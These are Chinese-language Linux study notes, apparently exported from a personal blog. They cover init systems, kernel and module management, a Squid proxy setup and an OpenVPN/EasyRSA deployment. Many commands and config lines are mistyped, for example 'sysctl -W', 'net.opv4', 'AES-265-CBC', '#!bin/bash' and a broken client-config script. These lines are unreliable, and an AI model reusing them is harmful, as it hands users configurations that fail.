src=\"http://image.xpshuai.cn/%E5%BC%95%E5%AF%BC%E8%BF%87%E7%A8%8B2.png\"/>\n\n<img src=\"http://image.xpshuai.cn/%E5%BC%95%E5%AF%BC%E8%BF%87%E7%A8%8B3.png\"/>\n\n\n## 三种INIT\n>接上面\n\n**1.SysV / SysV-init**\n源自UNIX System V (目前老版本Linux还在使用)\n\n**2.Upstart**\n兼容SysV，Ubuntu意图用于替换SysV，其他发行版也有使用\n几乎没有完整实现的Upstart（Ubuntu自己都不用Upstart了）\n\n**3.Systemd**\n目前主流发行版使用`systemd-sysv`包兼容SysV格式的initd脚本\n始于2010年，是目前最新的系统初始化后台程序;\n速度更快，效率更高\n\n\n#### SysV\n- 分成不同运行级别的一组Shell脚本(哪些程序，什么时候运行)\n- 每个程序有一个独立的脚本控制其启动或停止\n- 系统启动时进入一个运行级(一组随系统启动的程序)\n- 内核启动首先读取运行级别配置文件，决定进入哪个运行级\n- 运行级别：\n```bash\n0  关机\n1  单用户模式(系统维护)\n2  Debian多用户图形模式、\n3  多用户文本模式\n4  未定义\n5  RedHat多用户图形模式\n6  重启系统\n# 不同发行版可能略有不同\n```\n\n###### 在不同运行级下启动程序的方法\n**方法1：`/etc/ inittab`：定义不同运行级下启动的程序，每行定义一个应用程序**\n```bash\nid:runlevels:action:process\n#- ID: 包含1-4个字符，唯一标识一个程序\n#- runlevel: 运行级列表(在哪个运行级中运行该程序，例如: 345)\n#- action:\n#- id:3:initdefault: 系统启动后默认进入的运行级\n```\n\n**方法2：启动脚本**\n`/etc/init.d/`下的脚本\n`/etc/rc1.d`为例是不同级别1下要运行的程序(符号链接)，`K`开头表示kill掉,`S`是启动，后面数字的值代表优先级，最后面代表程序的名称\n\n除了运行级，SysV也使用启动脚本控制程序启动、停止\n启动脚本存放于`/etc/init.d/`中，通过`/etc/rcX.d/`目录调用(X 运行级)\n脚本文件名`S: Start`; `K: Kill/Stop`，` 数字表示优先级`(依赖顺序)\n通过具体脚本启动停止程序稍嫌麻烦，系统包含工具指定脚本的运行级\n```bash\n# 给我们提供了管理工具\nchkconfig / update-rc.d  #用于查看和修改程序的运行级(RedHat / Debian)\nchkconfig --list <program_name>    #查看\nchkconfig -- levels 12345 <program_name> on    #设置\nupdate-rc.d program defaults / update rc.d <program_name> remove\nupdate- -rc.d -f <program_name> start 40 2 34 5. stop 80 0 1 6. #具体运行级别和顺序(在那几个级别启动这个程序，在那几个级别stop这个程序)  40、80指在具体运行级中程序的启动顺序(0-99)\n```\n\n\n**action字段**(在Ubuntu中已经找不到了)\n- boot  进程在系统扃动时启动\n- bootwait  进程在系统启动时启动，系统会等待它启动完成\n- initdefault  系统默认进入的运行级别\n- kbrequest  进程在按下特殊的组合键后启动\n- once  当进入运行级别时，进程启动一次，后面down了也就不管了\n- powerfail  系统关闭时才运行\n- powerwait  系统关闭时才运行，系统将等待其运行完成\n- respawn  进入运行级时启动，并在终止时重新启动（病毒可以这样，你杀掉之后过一会又会起来）\n- sysinit  在boot和bootwait项之前启动\n- wait  进程启动一次，系统等待其完成\n  \n\n**查看系统运行级**\n```bash\nrunlevel    # 显示之前和现在的运行级\nN  5    # 上面命令的执行结果\n# N    表示系统【之前】处于原始boot运行级\n# 5    表示【当前】运行级\n```\n**更改运行级**\n```bash\ninit 6    # 重启系统(teljinit)\ninit 0    # 关机\n\n# init的问题在于命令立刻生效。这对个人电脑没有问题，但对多用户环境有影响（可能造成其他用户也...）\n# 多用户环境，建议使用shutdown、halt、 poweroff、 reboot (时间、通知)\n\n## 接受别人给发的通知\nmesg y    # 开启\nmesg    # 查看\n\nwho -T    # 第二列终端前面如果有+号，表示他允许别人给他发消息\n\nwrite xps tty1     # 给指定用户在某个指定的终端发送消息\n#运行后直接写消息就行\n\nwall xxxxxxx   # 给所有登录用户发消息（广播）\n\n```\n\n\n#### Upstart\n- 操作系统的复杂度不断上升，造成SysV脚本越来越复杂\n- ubuntu官方开发Upstart用于替换SysV\n    - 处理可热插拔设备在Linux系统中造成的动态环境\n    - 使用公钥`/etc/init/`文件夹替代/etc/inittab 和/etc/init.d 中的启动脚本\n    - 每个程序和服务在init文件夹中都有一个`<program_name>.conf`配置文件\n    \n\n启动和停止服务\n```bash\nsudo start/stop bluetooth        # ubuntu中没有\n```\n\n\n\n**Linux Standard Base (LSB)**\n- 是一些Linux发行版协商共同支持的规范\n- 目的是在不同Linux发行版之间创建一 致的使用体验\n- LSB定义了标准的init命令:·`start、 stop、 restart`\n- 所有遵循L SB的Linux发行版都应该支持以上命令\n- 但是Debian等发行方退出了LSB组织，目前ubuntu中不包含\n```bash\nlsb_release -a    # \n```\n\nLinux世界可能会日趋分裂，统一用户体验的缺失势必提高用户的学习成本\n\n\n#### Sytemd(目前最主流)\n- 由RedHat开发，并迅速流行于Linux世界\n    - Systemd 在系统初始化的方式上引入了一个主要的范式转换，并引起了一些争议\n    - 它放弃使用多 个小型初始化脚本，转而`使用单一程序`，配合每个服务独立的配置文件\n        - 这违背了早期的Linux哲学(小而专著是性能、稳定、安全性的基础)\n\n- 放弃了初始化脚本和运行级，Systemd创造了`target / unit`的概念\n    - `unit`用来定义service、action\n    - 由名称、类型、配置文件组成\n    - 常见unit类型\n    ```bash\n    automount、 device、 mount、 path、 service、 snapshot、 socket、 target 等等\n    ```\n\nunit的命名方式\n```bash\nname.type    # 如sshd.service\n```\n\n当前系统已加载的unit\n```bash\nsystemctl list- -units     # 查看\n```\n\nSystemd 使用service类型的unit 管理后台服务\n\ntarget 类型组合多个unit实现同时启动\n```bash\n例如network.target组合了所有用于启动网卡的unit\n系统初始化过程中，target 类似于SysV中运行级别的概念\n一个target对应- -组service\n```\n\n**配置unit**\n每个unit需要一个配置文件来定义需要启动、如何启动什么程序\n配置文件路径`/lib/systemd/system/`，不同版本，路径不尽相同\n```bash\ncat /lib/systemd/system/ssh.service\n    ExecStart    #指定运行程序\n    After    #依赖的服务(先于ssh服务运行的程序)\n    WantedBy    #指定target (运行级)\n    Restart    #何时重启\n```\n\n\ntartget配置文件\n```bash\n定义需要启动的unit(不定义具体程序)\n# 以graphical为例\ncat /lib/systemd/system/graphical.target\n```\n\n默认target\n```bash\n# 系统引导后默认启动的target(default.target)\n/lib/systemd/system/default.target -> graphical.target    # 只需对目标做个软链接\n```\n\nsystemctl程序\n```bash\n# 常用参数\nlist-unites / start / stop / restart / reload /status /\nenable / disable    #计算机每次引导时启动/禁用\nisolate             #启动指定单元(停止其他所有单元)\ndefault    #修改默认target\n```\n\n兼容SysV\n```bash\n# 对应的运行级别\n/lib/ systemd/system/runlevel0.target    # poweroff.target\n/lib/ systemd/ system/ runlevel1.target    # rescue.target\n/lib/ systemd/ system/ runlevel5.target    # graphical.target\n/lib/ systemd/ system/ runlevel6.target    # reboot.target\n\n# 比如，进入到运行级别1\nsystemctl isolate runlevel1\n```\n\n\n\n## 内核\n#### Linux系统组成\n- Linux内核\n- GNU系统工具\n- 图形化桌面环境\n- 应用软件\n\n#### 内核控制计算机软硬件\n- 由L inus Torvalds(当年是赫尔辛基大学的学生)创造，\n- 直到目前为止的负责人(Linux Foundation)\n\n\n\n#### 操作系统的核心功能\n- 管理系统的内存\n- 管理软件程序\n- 管理硬件\n- 管理文件系统\n\n- 如何安装内核(其不同的组成部分)？\n- 如何创建新内核(支持新硬件和软件特性)？\n- 如何管理内核及内核模块？\n\n\n#### 内存管理\n- 在系统的内存容量限制下，控制程序如何运行\n- 除管理物理内存，操作系统还负责创建和管理`虚拟内存`\n    - 虚拟内存并非真实存在，它`利用硬盘空间`创建并当作真实内存使用(`SWAP`)\n    - 内核将一段时间不活跃的内容页转储到SWAP，并在需要时重新读入物理内存\n    - `Swapping out机制`使系统认为自己拥有更多可用的内存空间(降低性能)\n    - 内存空间被分组到称为内存页的块中\n    - 内核定位物理内存或交换空间中的每个内存页\n    - 内核维护内存页表，登记哪些页位于物理内存/SWAP\n\n<img src=\"http://image.xpshuai.cn/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86.png\"/>\n\n\n**查看虚拟内存**\n```bash\ncat / proc/ meminfo    # 运行实时的数据\n# \nMemTotal:    2048000 kB    # 物理内存\nMemFree:    438123 kB      # 空闲\nMemAvilable    3580848 KB    # 实际可用的空间\nSwapTotal:     2048000 kB    #\nSwapFree:    2048000 kB\n```\nLinux系统每个进程的内存彼此独立\n```bash\n不同进程无法互访彼此内存空间，内核负责维护这种约束\n没有其他进程可以访问内核使用的内存空间\n```\n共享内存页\n```bash\n内核可创建共享的内存区域，供多进程共享数据，内核负责验证和准入进程\n```\n\n查看当前系统共享内存页\n```bash\nipcs -m    \n\n# 结果字段：\nowner    #创建此共享内存段的帐号\nperms    #共享权限\nkey    #允许其他用户访问此内存段\n```\n\n\n#### 软件程序管理\n运行中的程序称为进程\n```bash\n内核控制所有进程运行(前台运行、后台运行)\n初始化进程(init) 负责启动所有其他进程\n内核每启动一个进程，都在内存中为其分配独享的一段内存区域存放数据、代码\n```\n\n查看当前进程\n```bash\nps\nps -ax    # 建议加参数\n\n## 显示的字段含义\n# PID：进程ID\n# STAT：进程状态(Sleep、 Sleep and Wait、Run)\n# [process] swapping out    带放括号的都是放到虚拟内存中的\n```\n\n\n#### 硬件管理\n- 与系统通信的所有硬件都需要将驱动植入内核\n```bash\n内核编译同时包含硬件驱动(早期唯一方法)\n驱动程序以内核模块型式加载\n```\n\n- 内核模块是一个自包含的驱动程序库，可动态与内核链接/取消链接\n- Linux系统的三种硬件设备文件\n```bash\n1. 字符设备文件: 一次只能处理一个字符数据的设备(调制解调器、终端)   c\n2. 块设备文件: 一次能处理一大块数据的设备(硬盘)      b\n3. 网络设备文件:使用包来发送和接收数据的设备(网卡)     \n```\n\n\n**Linux为系统上的每个硬件设备创建称为节点的特殊文件**\n- 内核通过`唯一的数字对`标识每个节点(`主`、`次`)\n- 同类型设备主节点号相同，同一主节点号下，次节点号唯一\n```bash\ncd /dev && ls -al sd* ttyS*\n# 结果显示\nbrw-rw---- 1 root disk 8, 0 12月5 15:14 sda    # 8，0 主设备标识/次设备标识\nbrw-rw---- 1 root disk 8, 1 12月5 15:14 sda1\nbrw-rw---- 1 root disk 8, 16 12月5 15:14 sdb\nbrw-rw---- 1 root disk 8, 17 12月5 15:14 sdb1\ncrw- -rW---- 1 root uucp 4, 64 12月5 15:14 ttyS0\ncrw-rw---- 1 root uucp 4, 65 12月5 15:14 ttyS1\n\n```\n\n\n#### 文件系统管理\n文件系统定义OS如何在存储设备上存储数据\n- 分区、格式化\n- Linux 支持包括Windows在内的众多文件系统\n- 内核统一使用Virtual File System (`VFS`) 与不同文件系统进行交互\n\n\n#### 内核的文件构成\n**内核二进制文件**\n- 内核程序本身，BootLoader加载到内存中执行的内容(位于`/boot`或`/`中)\n- 基于编译打包的驱动数量不同，内核=进制文件可能很大\n- 内核二进制文件通常被压缩，以便加载内核时节省内存空间\n- 压缩方式不同，将导致内核二进制文件名称差异\n\n\n| 不同的Linux内核文件 |                         备注                          |\n| ------------------ | ----------------------------------------------------- |\n| bzimage            | （常用）GNU zip压缩的大内核，常被拷贝为4(vmlinuz)        |\n| kernel             | 未压缩                                                |\n| vmlinux            | 未压缩，通常不用作最终的引导版本                         |\n| vmlinuz            | 通用的压缩文件（如ubuntu下：vmlinuz-4.15.0-65-generic） |\n| zimage             | 使用GNU zip压缩的小内核                                |\n|                    |                                                       |\n\n\n#### 内核模块\n**内核直接与硬件交互**\n- 内核与硬件通信需要驱动程序的支持\n- 将硬件驱动和内核的`源码`一并编译成二进制执行文件(体积大)\n- 将驱动编译为二进制的模块对象文件`.ko`， 运行时动态链接\n\n**硬件驱动的发布**\n- 源码：开源精神\n- 二进制文件：保护隐私、功能特性\n\n**内核模块(`modprob`)**\n```bash\n/lib/modules/<version>/kernel/*.ko\n```\n\n\n#### 内核源码\n**获得**\n- Linux内核开发库(www.kernel.org --> 稳定版、开发版)\n- 对应Linux发行版的软件库(对本发行版最稳妥，下载方便)\n- 下载源码解压至`/usr/src/linux` (内核工具默认查找路径)\n```bash\n链接到指定版本 /usr/src/linux-5.3.12    # 维护多个版本\n/usr/src/kernels    # Redhat\n```\n\n\n#### 内核补丁\n- 针对bug修复和安全补丁的增量内核发行版\n- 内核补丁版本(`针对主版本的补丁`)\n    - 只包含应用于主内核源代码发行版以获得增量发行版的`更改`(5.3 --> 5.3.1)\n    - 使用`patch`命令将补丁源码包应用于主源码包，然后重新编译\n- 后续补丁版本(5.3.1 -> 5.3.2)\n    - 卸载早期版本补丁(`patch -R`)\n    - patch新版本补丁\n    - 重新编译\n\n\n\n#### 内核头\nLinux内核绝大部分使用C语言编写\n    - C语言头文件:编译时需要的库文件\n    - 编译内核、模块都需要相同的内核头(库文件)\n\nUbuntu内核头\n```bash\nsudo apt install linux-headers-4.15.0-72-generic\n/usr/src/linux-headers-4.1 5.0-72-generic/include/config/*.h    # ubuntu\n/usr/src/kernels    # Redhat\n# 不同发行版路径不同\n\n# 查看使用的内核版本\nuname -r\n```\n\n\n#### 内核文档\n- 许多独立的文本文件，说明每个源代码文件在内核结构中的作用\n- 针对内核源码做任何操作之前，建议详细阅读文档\n- 由于文档体量巨大，通常以独立包形式发布\n- 文档路径\n```bash\n/usr/src/linux/Documentation    # Ubuntu\n/usr/src/kernels    # Redhat\n```\n\n\n#### 内核版本\n- 七个内核版本命名方式(系统)\n- Linus于1991年9月发布了初始Linux内核版本号<font color=red>0</font>.01\n    - 0表示该版本目的是测试，并非生产环境使用(延用至0.95 -- 1 992.3)\n- 1994年3月，Linus 发布了Linux 的第一个生产版本<font color=red>1</font>.0 (`1.x.y`)\n    - x主版本号(`奇数`表示测试/开发版本；`偶数`表示稳定/生产版本)\n    - y主版本下的补丁版本\n    - 此版本号延用至 1.3 (1995.5)\n\n- 1.3之后Linux内核变化很大，因此下一个版本为<font color=red>2</font>.0 (1996.6)\n- 2.x.y延用1.x.y 的命名方式，直至2.4 (2001.1)\n- 2003.12 Linus发布2.6.0版本，启动了一个新的版本命名系统\n    - 由于2.6内核非常稳定，因此新内核版本格式为2.6.x.y（`不再通过奇偶数来区分稳定与否`）\n    - 2.6 每个版本都是生产版本(`开发版结尾为-rc`)\n    - 此版本延用至2.6.39 (2011.5)\n\n- 2011.7 Linus为庆祝Linux内核20岁生日，启动了内核的3.0版本\n    - 3.x.y (开发版在结尾加-rc) -直延用至3.19 (2015.2)\n    - 3.x.y-<font color=red>z</font> 临时特殊补丁版(主要与紧急的安全修复有关)\n- 2015.4发布4.0版本\n    - 4.x.y (与3.0相同)\n    - 4.x.y-<font color=red>z</font> (y的第z次`微调`版本)\n- 2019.3发布5.0版本\n    - 目前最新，命名延用以前\n\n查看内核版本\n```bash\nuname -r\n```\n\n\n#### 维护内核\n- 手动编译内核(较少使用，忽略)\n- 使用发行版包管理器维护内核（建议的方式）\n- 模块文件\n```bash\n/lib/modules/version/kermel/*.ko\n```\n- 手动编译内核模块，当升级内核时需要重新编译模块\n    - Dynamic Kernel Module Support (`DKMS`)\n    - 注册自定义模块后，dkms监视内核变化，并自动运行脚本重新编译安装模块\n\n\n\n#### 常用模块命令\n```bash\n# 已安装模块列表\nlsmod    # 模块之间存在依赖关系\n\n#  查看模块详细信息\nmodinfo bluetooth    # 比如查看蓝牙模块的信息\n\n# 安装/删除模块\ninsmod / rmmod    # 需指定'完整'内核模块文件路径(依赖模块未加载时失败)\nmodprobe -r    # 或者这种方式安装，只需指定模块名，自动安装依赖（比较友好）\n```\n\n\n#### 内核排错\n**查看内核版本**\n```bash\nuname -r    # -a显示全部信息\n```\n\n**/proc目录**\n```bash\n# Linux内核创建的动态伪目录\n# 在内核运行时查看内核相关的配置、性能\n# 包含硬件信息\n\n/proc/interrupts    # 被分配的中断信息\n/proc/ioports    # I0端口使用情况\n/proc/dma    # DMA\n\nlsdev    # 查看以上综合参数的命令，apt install lsdev\ncat /proc/sys/kernel/version     # 查看内核参数\n\n\n## 修改内核参数\ncat /proc/sys/net/ipv4/ip_forward/        # 如：开启路由功能，查看\necho 1 > /proc/sys/net/ipv4/ip_forward    # 如：开启路由功能，修改\n\nsysctl net.ipv4.ip_ forward1    # 或者使用命令，查看\n/sysctl -W net.ipv4.ip_ _forward=1   # 使用命令开启，修改\n\n/etc/sysctl.conf    # net.ipv4.ip_ forward = 1    修改配置文件，让它永久生效\n\n# 其他发行版可能在这个目录修改\n/etc/sysctl.d    \n\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["内核"],"categories":["Linux"]},{"title":"ubuntu server-代理&VPN","url":"%2Fposts%2F39742%2F","content":"\n\n\n\n\n>你看见的不是你真的看见的\n\n- 时间、带宽、管控都影响网络使用体验\n- 作为改善技术，VPN/代理和突破限制改善体验\n- 区别：代理主要提高访问`速度`；VPN更注重`安全`性\n- 在某些应用场景中，作用非常相似\n- 作为中间层，双向模拟（翻墙）\n\n【访问者】 --> 【中间层】 --> 【目标】\n\n\n## <font>代理(Proxy)</font>\n#### 网络代理服务\n- 客户端访问请求发给Proxy，而非直连目标\n- 代理转发请求给目标，并将结果返回给客户\n\n#### 正向代理\n提高速度、内容控制、安全\n（代替正常用户来访问资源）\n\n#### 反向代理\n速度、安全、分发\n（代替一个代理服务器接收资源，转发给后面的代理服务器，然后把后面代理服务器资源分发给用户。比如Nginx反向代理）\n安全性：反向代理服务器上可以进行安全性过滤，比如waf等\n\n\n#### Squid\n>全面的一个代理软件\n###### 用squid实现正向代理\n1.安装squid\n```bash\nsudo apt install squid\n```\n\n2.配置\n```bash\nvim /etc/squid/squid.conf    # 主配置文件\n\n# acl：访问控制列表/资源列表 \nacl localnet src 192.168.0.0/16    # 先配置内部网段，指定源地址，只给这个网段做代理\n\nacl menhu111 dstdomain .sina.com .sina.com.cn .163.com    # 目标域名，多个以空格分隔。小心页面元素CSS、图片(有些资源不属于那个域的下面)\nacl xiaban111 time MTWHFAS 18:00-23:59    # 定义时间，下班时间，MTWHFAS（周1-7），不限制访问。是服务器本地时间\n# Mon, Tues, Wednes, tHurs, Fri, sAtur, Sun, D: 工作日\nacl noexes url_regex -i \\.exe$    # URL以exe结尾（-i大小写不敏感）\nacl httpsurls url_regex -i ^https  # 以 ^URL起始\nacl noporn url_regex -i sex    # \nacl zipfiles url_regex -i \\.zip$\n\n\n# http访问规则顺序匹配（按前后顺序执行）\n# 原则：【禁止规则】一定要放在【允许规则】前面\nhttp_access deny !Safe_ports    # 不是Safe_ports的端口，都禁止\nhttp_access deny noexes noporn   # 原则：【禁止规则】一定要放在【允许规则】前面\nhttp_access deny CONNECT !SSL_ports  # 如果不是SSL_ports的端口，如果发起Connect请求的话，也是禁止的\nhttp_access allow localhost    # 允许所有人请求我代理服务器的本地\nhttp_access allow localnet menhu111 xiaban111    # 允许本地地址访问后面指定的目标域名\nhttp_access allow localhost manager    # 缓存到代理服务器本地\nhttp_access deny manager\nhttp_access deny all    # 除了上面明确允许的，其他的一概禁止(这条规则要放到最后面)\n# http_access allow all\n```\n3.修改完之后，重新加载配置文件\n```bash\nsudo kill -SIGHUP `cat /var/run/squid.pid`\n\n```\n\n\n默认侦听3128代理端口，在配置文件可以修改\n```bash\nhttp_port 3128\n# 默认侦听所有网卡的所有3128端口,建议不要对公网开放代理\n# 指定侦听网卡\nhttp_port 192.168.0.1:3128\n\n```\n\n访问日志\n```bash\naccess_log daemon:/var/log/squid/access.log squid\n```\n\n缓存\n```bash\ncache_dir ufs /var/spool/squid3 100 16 256    # 缓存路径，多大，周期\nrefresh_pattern -i \\.(gif|png|jpg|jpeg|ico)$ 3600 90% 86400    # 缓存图片\n```\n\n\n\n\n## <font>VPN</font>\n#### 原理\n###### 企业内部系统不应对外开放\n- 出差在外的企业员工需要访问公司内部系统\n- 分公司、合作商需要安全的访问指定企业内部系统\n- 专线网络费用高昂且不灵活\n- 远程访问安全性欠缺\n\n###### 虚拟专用网(VPN -- Virtual Private Network)\n- 基于并不安全的网络线路，通过加密技术构建安全的信息通道（tunnel）\n- VPN用户获得如同在内网一样的访问使用体验\n\n\n###### 与Proxy相比\n- VPN更加安全、成本高、部署难度大\n- VPN一旦部署完成后简单使用\n- Proxy属于一种中间层，VPN更接近路由（对应用透明，无需设置代理）\n- VPN更完善的认证、加密、授权控制\n\n###### VPN类型\n- PPTP\n- L2TP（用的少）\n- IPSec（保密性要求很高，过于复杂。常用于网络边界之间）\n- SSL（非常适合终端用户）\n\n\nOPenVPN\n- 全特性的开源SSL VPN\n- 跨平台 Windows、Linux、macox、ios、android\n\n\n\n#### OpenVPN\n- 通过非受信网络连接上网时保证安全\n- 出差员工访问企业内部系统\n- 伪装为国外地址，规避地理限制和审核（翻墙）\n- 需要（独立的）证书颁发机构CA，完成PKI架构\n\n\n###### 安装&配置\n>一台VPN服务器，一台CA服务器（每个服务器只做一个用途）\n\n题外话：ubuntu server 1804修改主机名之前，先把`/etc/cloud/cloud.conf`配置文件中修改为的`preserve_hostname`修改为true，然后再修改hostname和hosts\n\n\n1.安装OpenVPN（在VPN Server）\n```bash\nsudo apt install openvpn\n```\n\n2.安装EasyRSA(在VPN Server+ 在CA Server)\n```bash\n# ubuntu软件源也有，但是不是最新的，这里去github下载最新的\n# ca server 和vpn server都需要下载EasyRSA(一个作为客户端一个作为服务端)\nwget https://github.com/OpenVPN/easy-rsa/releases/download/v3.0.6/EasyRSA-unix-v3.0.6.tgz\ntar -xvf EasyRSA-unix-v3.0.6.tgz\n```\n\n3.配置安装（在CA服务器上）\n```bash\ncd ~/EasyRSA-v3.0.6/\ncp vars.example vars\n#vim vars\n    set_var EASYRSA_REQ_COUNTRY  \"CN\"\n    set_var EASYRSA_REQ_PROVICE  \"BJ\"\n    set_var EASYRSA_REQ_CITY     \"BJ\"\n    set_var EASYRSA_REQ_ORG       LAB\"\"\n    set_var EASYRSA_REQ_EMAIL     \"admin@lab.com\"\n    set_var EASYRSA_REQ_OU        \"IT\"\n\n# 初始化PKI架构\n./easyrsa init-pki\n# 会创建一个pki的目录，以后生成的证书会在这个目录下，证书的私钥会在这个目录下的privte下，证书申请文件会在这个目录下的reqs下\n```\n\n4.创建证书颁发机构，生成CA公私钥（在CA Server）\n```bash\n./easyrsa build-ca nopass    #证书私钥文件的访问密码，但是这里不设置\n# 下面设置证书的名字，默认不改\n# ca.crt    公钥证书，用于验证CA前面的其他证书（C/S都需要）\n# ca.key    CA的私钥，用于前面所有C/S证书（应私密保存）\n# 证书服务器在不使用时，建议关机\n```\n\n5.生成VPN服务器私钥和证书申请文件（在VPN Server）\n```bash\ncd EasyRSA-v3.0.6/\n./easyrsa init-pki    # 只是初始化PKI架构\n./easyrsa gen-req vpnserver nopass    # 生成证书申请文件，起个名字，设置密码\n# pki/reqs/vpnserver.req\n# pki/private/vpnsenver.key    # 私钥文件要好好保存\nsudo cp pki/private/vpnserver.key  /etc/openvpn    # 拷贝私钥文件\n\n# 将证书请求文件传输至CA签发\nscp pki/reqs/vpnserver.req  xps@CA_IP:/tmp\n```\n\n6.导入并签发VPN服务器证书（在CA Server）\n```bash\n./easyrsa import-req /tmp/vpnserver.req vpnserver    # 导入，加一个名字\n./easyrsa sign-req vpnserver vpnserver    # 签发， pki/issued/vpnserver.crt\n# 证书类型  server / client\n\n## 将证书回传至vpnserver\nscp pki/issued/vpnserver.crt xps@vpnserver_IP:/tmp/    # vpnserver证书\nscp pki/ca.crt xps@vpnserver_IP:/tmp/    # CA公钥证书（自建的证书，要想被信任，必须获得ca服务器的公钥）\n\n```\n\n7.拷贝证书文件（在vpnserver）\n```bash\nsudo cp /tmp/{vpnserver.crt, sa.crt}  /etc/openvpn\n\n# 生成Diffie-Hellman密钥（密钥交换）\n./easyrsa gen-dh    # 生成HMAC签名（TLS完整性校验）   dh.pem \nopenvpn --genkey  --secret ta.key    # 生成安全密钥\nsudo cp ta.key /etc/openvpn/\nsudo cp pki/dh.pem  /etc/openvpn/\n\n# 服务端证书设置全部完成\n\n```\n\n8.客户端证书（在VPN Server）\n```bash\n# 客户端也要证书来证明自己的身份\n## 在 VPN服务器上生成客户端证书\n## 使用脚本批量自动生成客户端配置文件\n## 生成客户端证书密钥 / 请求文件\n\nmkdir -p ~/client-configs/keys    # 证书文件目录\nchmod -R 700 ~/client-configd     # 配置文件目录\ncd ~/EasyRSA-v3.0.6/\n./easyrsa gen-req client_1 nopass    # client_1\ncp pki/private/client_1.key  ~/client-configs/keys/\nscp pki/reqs/client_1.req xps@CA_IP:/tmp/    # 证书的请求文件\n\n```\n\n9.导入并签发证书（在CA Server）\n```bash\n./easyrsa import-req /tmp/client_1.key client_1   # 导入\n./easyrsa sign-req client client_1              # 签发（证书类型，证书column name）    \nscp pki/issued/client_1.crt xps@vpnserver_IP:/tmp/\n```\n\n10.复制证书文件（在VPN Server）\n```bash\ncp /tmp/client_1.crt  ~/client-configs/keys/\ncp ~/EasyRSA-v3.0.6/ta.key  ~/client-configs/keys/\nsudo cp /etc/openvpn/ca.crt ~/client-configs/keys/\n```\n\n**客户端证书文件准备完毕，下面步骤都是在VPN服务器上配置**\n\n11.vpn服务器配置文件\n```bash\nsudo cp /usr/share/doc/openvpn/examples/sample-config-files/server.conf.gz  /etc/openvpn/\nsudo gzip -d /etc/openvpn/server.conf.gz\nsudo vim /etc/openvpn/server.conf    # 配置文件，根据自己的情况来修改\n    tls-auth ta.key 0\n    key-direction 0\n    cipher AES-256-CBC\n    auth SHA256\n    dh dh.pem\n    user nobody\n    group nogroup\n    ; 下面，强制客户端【所有】流量路由到tun0（我的vpn隧道）\n    push \"redirect-gateway def1 bypass-dhcp\"    \n    push \"dhcp-option DNS 202.106.8.20\"\n    push \"dhcp-option DNS 8.8.8.8\"    ; DNS服务器可设多个\n    ;端口和协议\n    port 443\n    proto tcp    ；如果用TCP的1194，就无需这条\n    explicit-exit-notify 0\n    ;指定服务器证书文件\n    cert vpnserver.crt\n    key vpnserver.key\n    \n```\n\n12.启动服务器路由功能\n```bash\nsudo vim /etc/sysctl.conf\n    net.opv4.ip_forward = 1\nsudo sysctl -p\n```\n\n13.确认默认路由网卡名称\n```bash\nip route |grep default\n    default via 192.168.8.2  dev enp0s3 proto static\n```\n\n14.修改防火墙规则实现NAT\n```bash\n# 连上我的vpn之后，都把我的地址转换为路由绑定网卡的内网的地址，隐藏原本的地址\nsudo vim /etc/ufw/before.rules    # 优先级高于普通UFW规则\n    # START OPENVPN RULES\n    *nat\n    :POSTROUTING ACCEPT [0:0]\n    -A POSTROUTING -s 10.8.0.0/8 -o enp0s3 -j MASQUERADE    # -s 源地址\n    COMMIT\n    # END OPENVPN RULES\n```\n\n15.开启防火墙  \n```bash\nsudo vim /etc/degault/ufw    # 防火墙默认未开启转发包，这里开启转发包\n    DEFAULT_FORWARD_POLICY=\"ACCEPT\"    \n\n# 启动防火墙及规则\nsudo ufw allow 1194/udp   # vpn的端口允许\nsudo ufw allow OpenSSH    # 否则ssh连接不上了\nsudo ufw disable\nsudo ufw enable\n\n# 启动OpenVPN服务\nsudo systemctl start openvpn@server    # server.conf 的名称一致\nsudo systemctl status openvpn@server\nsudo systemctl enable openvpn@server\nip addr show tun0    # 发现多了一个网卡tun0\n```\n\n\n###### 客户端配置\n1.配置文件模板（用户只需傻瓜式操作即可，所有证书提前申请好，其他的用脚本方式执行）\n```bash\nmkdir -p ~/client-configs/files    # 配置文件存放的目录\ncp /usr/share/doc/openvpn/examples/sample-config-files/client.conf  ~/client-configs/base.conf\n\n# Linux客户端有这个文件：  /etc/openvpn/update-resolv-conf \n\nvim ~/client-configs/base.conf\n    # script-security 2        # 下面三行，仅仅针对Linux客户端(才取消注释)\n    # up /etc/openvpn/update-resolv-conf\n    # down /etc/openvpn/update-resolv-conf\n    remote vpnserver_IP 1194\n    proto udp\n    user nobody   \n    group nogroup     # Centos是nobody\n    # ca ca.crt\n    # cert client.key\n    # key client.key\n    # tls-auth ta.key 1\n    cipher AES-265-CBC\n    auth SHA256\n    key-direction 1\n\n```\n\n2.客户端配置脚本\n```bash\nvim ~/client-configs/make_config.sh    # 脚本参数为客户端标识名\n    #!bin/bash\n    KEY_DIR=~/client-configs/keys\n    OUTPUT_DIR=~/client-configs/files\n    BASE_CONFIG=~/client-configs/base.conf\n    cat ${BASE_CONFIG} \\\n    <(echo-e '<ca>')\\\n    ${KEY_ DIR}/ca.crt \\\n    <(echo -e '</ca>\\n<cert>')\\\n    S{KEY_ DIR}/${1}.crt \\        # ${1} 是脚本运行时的参数\n    <(echo -e '</cert>\\n<key>')\\\n    S{KEY_ DIR/${1}.key\\\n    <(echo e '</key>\\n<tls-auth>')I\n    ${KEY_DIR}/ta.key\\\n    <(echo -e '</tls-auth>') \\\n    > ${OUTPUT_ DIR}/${1}.ovpn\n\n\nchmod 700 ~/client-configs/make_config.sh\ncd ~/client-configs\n# 为每个用户申请证书\nsudo ./make_config.sh client_1\n    # 生成client_1.ovpn\n\n# 分别为每个用户端生成相应证书，然后运行脚本生成配置文件\n# 将.ovpn配置文件拷贝到客户单\n\n# 如果是Linux客户端，要把配置文件client.ovpn中下面三行取消注释\n    script-security 2       \n    up /etc/openvpn/update-resolv-conf\n    down /etc/openvpn/update-resolv-conf\n    \n# 如果是Centos系统，配置文件client.ovpn要修改\ngroup nobody\n```\n\n\n3.客户端安装\n```bash\n## Linux客户端安装\nsudo apt install openvpn\n\n## Linux客户端\nvim client.ovpn\n    script-security 2      \n    up /etc/openvpn/update-resolv-conf\n    down /etc/openvpn/update-resolv-conf\n\n```\n\n4.建立VPN连接\n```bash\n## 命令行方式\nsudo openvpn --config client_1.ovpn > /dev/null 2>&1 &\n\n## ubuntu图形化方式\n# 先安装openvpn的gnome小插件\nsudo apt install metwork-manager-openvpn\nsudo apt install 